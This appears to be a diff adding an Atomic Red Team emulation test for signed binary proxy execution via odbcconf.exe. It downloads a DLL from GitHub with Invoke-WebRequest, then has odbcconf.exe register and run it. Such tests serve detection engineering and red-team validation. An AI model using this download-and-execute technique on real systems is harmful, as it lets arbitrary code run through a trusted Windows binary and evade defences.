@@ -1,0 +1,16 @@
+#TechniqueName: Signed Binary Proxy Execution: Odbcconf
+#AtomicTestName: Odbcconf.exe - Execute Arbitrary DLL
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll"
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll) {exit 0} else {exit 1}
+
+
+#commands
+odbcconf.exe /S /A {REGSVR "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll"}
+
